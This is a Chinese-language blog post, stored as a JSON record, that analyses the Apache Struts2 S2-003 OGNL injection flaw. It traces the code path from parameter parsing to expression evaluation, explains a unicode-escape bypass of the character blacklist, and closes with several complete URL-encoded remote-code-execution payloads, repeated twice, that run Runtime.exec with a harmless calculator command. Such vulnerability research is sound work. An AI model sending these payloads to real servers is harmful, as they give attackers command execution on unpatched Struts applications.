{"posts":[{"title":"Apache Struts2 S2-003","content":"Struts2-003 参考文章 s2-003-su18 浅析OGNL表达式求值（S2003/005/009跟踪调试记录） 漏洞影响版本 Struts 2.0.0 - Struts 2.1.8.1 漏洞描述 在拦截器 ParametersInterceptor 调用 setParameters() 装载参数时，会使用stack.setValue() 最终调用 OgnlUtil.setValue() 方法来使用 OGNL 表达式解析参数名，造成漏洞。 流程分析 在之前梳理逻辑过程中提到过，程序会调用设置的拦截器栈来执行相关命令，其中一个拦截器是 ParametersInterceptor，这个拦截器会解析参数，将参数放入 OgnlValueStack root 中的 action 中，也同时将参数调用 set 方法写入要执行的 Action 类中。 在拦截器的 doIntercept() 方法中，初始化的过程中将 DENY_METHOD_EXECUTION 设置为 true。 然后调用 setParameters() 方法，循环参数 Map，首先调用 this.acceptableName(name) 来校验参数名是否非法，在较低版本中是判断是否包含 #,=: 在高一点的版本中是使用正则来匹配 如果校验通过则调用 stack.setValue(name, value) 方法，这个方法会将待解析的表达式以 “conversion.property.fullName” 的值放在 context 里，然后调用 OgnlUtil.setValue() 方法。 中间有个 compile() 方法会先调用 ognl.Ognl#parseExpression 方法，这个方法创建了一个 OgnlParser 对象，并调用其 topLevelExpression() 方法解析给定的 OGNL 表达式，并返回可由 OGNL 静态方法使用的表达式的树表示形式（Node）。 在 OGNL 中，有一些不同类型的语法树，这些在在解析表达式的过程中，根据表达式的不同将会使用不同的构造树来进行处理，比如如果表达式为 user.name，就会生成 ASTChain，因为采用了链式结构来访问 user 对象中的 name 属性。 这些树都是 SimpleNode 的子类中，且各子类都根据自己的特性需求对父类的部分方法进行了重写，这些特性可能导致表达式最终执行结果受到影响。这些树对应的表现形式以及重写的方法可以参考 这篇文章。 而本次漏洞触发形式就在于 (one)(two) 这种表达形式，属于 ASTEval 类型。 看一下解析执行流程： 取第一个节点，也就是 one，调用其 getValue() 方法计算其值，放入 expr 中； 取第二个节点，也就是 two，赋值给 source ； 判断 expr 是否为 node 类型，如果不是，则调用 Ognl.parseExpression() 尝试进行解析，解析的结果强转为 node 类型； 将 source 放入 root 中，调用 node 的 getValue() 方法对其进行解析； 还原之前的 root。 因此我们得知：使用 (one)(two) 这种表达式执行时，将会计算 one ，two，并将 two 作为 root 再次为 one 的结果进行计算。如果 one 的结果是一个 AST，OGNL 将简单的执行解释它，否则 OGNL 将这个对象转换为字符串形式然后解析这个字符串。 所以，比如使用 Runtime 弹计算器，原本的表达式可以这样写： @java.lang.Runtime@getRuntime().exec('open -a Calculator.app') 但是使用 (one)(two) 可以改成这样： ('@java.lang.Runtime'+'@getRuntime().exec(\\'open -a Calculator.app\\')')('Ki1ro') ('@java.lang.Runtime@'+'getRuntime().exec(#Ki1ro)')(#Ki1ro='open -a Calculator.app') 将 one 用字符串括起来，甚至是进行拼接，后面再跟一个括号，这样程序就会对 one 进行二次解析，第一次解析成为字符串，第二次解析成为对应的 AST 并执行，也可以将其中的部分变量拆分到 two 中，因为 two 会作为 one 的 root 解析执行，可以拿到其中的值。 又由于表达式的执行是由右向左执行的，因此向右面写入更多个括号，都会依次拆分，最后执行到 one 表达式中： ('@java.lang.Runtime'+'@getRuntime().exec(\\'open -a Calculator.app\\')')('Ki1ro1')('Ki1ro2')('Ki1ro3')('Ki1ro4')('Ki1ro5')('Ki1ro6') 或者向左叠入更多层级的括号： ('Ki1ro6')(('Ki1ro5')(('Ki1ro4')(('Ki1ro3')(('Ki1ro2')(('@java.lang.Runtime'+'@getRuntime().exec(\\'open -a Calculator.app\\')')('Ki1ro1')))))) 这些写法都不影响最终 one 表达式的执行，如均可以成功弹出计算器。 以上是使用Ognl.parseExpression() 加 Ognl.getValue() 来执行的，与 OgnlUtil.getValue() 一致。 那使用 OgnlUtil.setValue()，调用会一致吗？答案是否定的。 跟进分析下Ognl.setValue，看看哪里的出现了问题。 OgnlUtil.setValue() 的调用链为：OgnlUtil.setValue() -&gt; OgnlUtils.compile() -&gt; Ognl.setValue() -&gt; Node.setValue() -&gt; SimpleNode.evaluateSetValueBody() -&gt; ASTEval.setValueBody()。 ASTEval.setValueBody() 与 ASTEval.getValueBody() 类似，都是 取第一个节点，也就是 one，调用其 getValue() 方法计算其值，放入 expr 中； 取第二个节点，也就是 two，赋值给 source ； 判断 expr 是否为 node 类型，如果不是，则调用 Ognl.parseExpression() 尝试进行解析，解析的结果强转为 node 类型； 将 source 放入 root 中，调用 node 的 setValue() 方法对其进行解析； 还原之前的 root。 在第4步中出现了分歧，ASTEval.setValueBody()调用的是setValue()。 接着会再次调用 SimpleNode.evaluateSetValueBody() -&gt; ASTChain.setValueBody 。 ASTChian.setValueBody() 和 ASTChian.getValueBody() 主要的区别是 ASTChian.setValueBody() 只循环到倒数第二个节点即 children.length - 2 ，而 ASTChian.getValueBody() 则循环到最后一个节点即 children.length - 1 。 造成这个不同的原因主要是两个方法的功能点不同： setValueBody 中使用 children.length - 2 是因为它需要处理最后一个子节点的值设置操作，而 getValueBody 中使用 children.length - 1 是因为它需要处理所有子节点的值获取操作。 ASTChian.setValueBody() 遍历完后，会调用最后一个子节点的 setValue 方法。 我传入的OGNL表达式为 ('@java.lang.Runtime'+'@getRuntime().exec(\\'open -a Calculator.app\\')')('Ki1ro') ，所以最后一个子节点为 exec(&quot;open -a Calculator&quot;) ，其AST构造树为 ASTStaticMethod 。 之后会调用 SimpleNode.evaluateSetValueBody() ，接着调用 setValueBody() ， ASTStaticMethod 并没有重写 setValueBody() ，从而会调用 SimpleNode.setValueBody 从而触发报错。 对于 Ognl.setValue 解析的问题，网上主要是通过增加 ASTEval 的子节点来解决。 这里提出了另外一种方法，增加 ASTChain 的子节点，使得要执行的方法在 ASTChian.setValueBody() 的循环中能够执行。 例如下面的 Payload： ('@java.lang.Runtime'+'@getRuntime().exec(\\'open -a Calculator.app\\').Ki1ro')('Ki1ro') 跟原来的 Payload 相比，在 exec 后又增加了一个链式结构，使得解析的 ASTChain 的子节点增多，让 exec 能够在循环中提早进行调用。 如下图的测试结果，可以成功弹出计算器。 但要注意的一点是，这个方法只适用于ASTChain，其他的语法树不一定适用，所以通解依然是第二种方法。 第二种网上主要的方法是利用在第一次 ASTEval.setValueBody() 中，在调取两个子节点时，总是需要调用 getValue 。 通过增加 ASTEval 中的子节点数量，让 children[0] 为我们原本的Payload。 例如如下的一些Payload： ('@java.lang.Runtime'+'@getRuntime().exec(\\'open -a Calculator.app\\')')('Ki1ro')('Ki1ro') ('@java.lang.Runtime'+'@getRuntime().exec(#aa)')(#aa='open -a Calculator.app')('Ki1ro') 以第一个 Payload 来具体说明，当第一次执行 ASTEval.setValueBody() 时， children[0] 从原来的 (&quot;@java.lang.Runtime&quot; + &quot;@getRuntime().exec(\\'open -a Calculator.app\\')&quot;) 变为了 ((&quot;@java.lang.Runtime&quot; + &quot;@getRuntime().exec(\\'open -a Calculator.app\\')&quot;))(&quot;Ki1ro&quot;) 。 相等于原 Payload 从 children[0].getValue() 开始解析执行。 如下图的测试结果，也可以成功弹出计算器。 上面讨论了调用静态方法的表达式，那如果想要修改 context 里的值呢？根据官方文档的描述和测试的结果，以下的方式都可以： ('#context[\\'key\\']=aaaa')('Ki1ro') ('#context[\\'key\\']')('Ki1ro')=aaa ('#context[\\'key\\']=#a')(#a='aaa') 还有关键的一点是：在对表达式进行解析时，由于在 OgnlParserTokenManager 方法中使用了 ognl.JavaCharStream#readChar() 方法，在读到 \\\\u 的情况下，会继续读入 4 个字符，并将它们转换为 char，因此 OGNL 表达式实际上支持了 unicode 编码，这就绕过了之前正则或者字符串判断的限制。 在解析完表达式执行方法的时候，会调用 XWorkMethodAccessor#callMethod/callStaticMethod 方法，在调用之前会在 context 中取 xwork.MethodAccessor.denyMethodExecution 的值转为布尔型进行判断，如果是 true 则不会调用方法，只有为 false 才会进行调用。 默认的OGNL调用方法时，获取的是 ObjectMethodAccessor ，而在struts2下获取的是 XWorkMethodAccessor ， XWorkMethodAccessor 重写了 callMethod 和 callStaticMethod，调用前会先查看是否禁用的方法调用。 因此，这个漏洞的触发流程就明确了，攻击者在参数名处传入恶意表达式： 使用 unicode 编码特殊字符绕过对关键字符黑名单的判断； 将 context 中的 xwork.MethodAccessor.denyMethodExecution 值修改为 false，这样在后面才可以调用方法； 执行恶意的表达式。 因此 S2-003 的漏洞利用 payload 为： (ki1ro1)(('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003d%5Cu0023ki1ro2')(%5Cu0023ki1ro2%5Cu003dnew%5Cu0020java.lang.Boolean(false)))&amp;(ki1ro3)(('%5Cu0023ki1ro4.exec(%5C'open%20-a%20Calculator.app%5C')')(%5Cu0023ki1ro4%5Cu003d@java.lang.Runtime@getRuntime())) (%27%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(abc)(def)&amp;('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('ki1ro') ('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')('aa')('bb')&amp;('%5Cu0023ki1ro%5Cu003d@java.lang.Runtime@getRuntime().exec(%5C'open%20-a%20Calculator.app%5C')')('ki1ro')('cc') 当然也可以根据上面的分析随意改成自己喜欢的样子。这里有一点要注意的是，可以看到第二个 payload 没有直接使用 @ 调用静态方法的方式，而是使用了 #ki1ro= 进行了赋值，这是因为在 OGNL 对参数解析时，静态方法的解析会排在其他方式的前面，这就导致了还没修改 context 里的值，导致无法执行，所以先进行了赋值。主要的原因是 TreeMap 的默认排序是按照 key 的字典顺序排序即升序。 Payload (ki1ro1)(('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003d%5Cu0023ki1ro2')(%5Cu0023ki1ro2%5Cu003dnew%5Cu0020java.lang.Boolean(false)))&amp;(ki1ro3)(('%5Cu0023ki1ro4.exec(%5C'open%20-a%20Calculator.app%5C')')(%5Cu0023ki1ro4%5Cu003d@java.lang.Runtime@getRuntime())) (%27%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(abc)(def)&amp;('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('ki1ro') ('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')('aa')('bb')&amp;('%5Cu0023ki1ro%5Cu003d@java.lang.Runtime@getRuntime().exec(%5C'open%20-a%20Calculator.app%5C')')('ki1ro')('cc') ","link":"https://Ki1ro0133.github.io/post/apache-struts2-s2-003/"}]}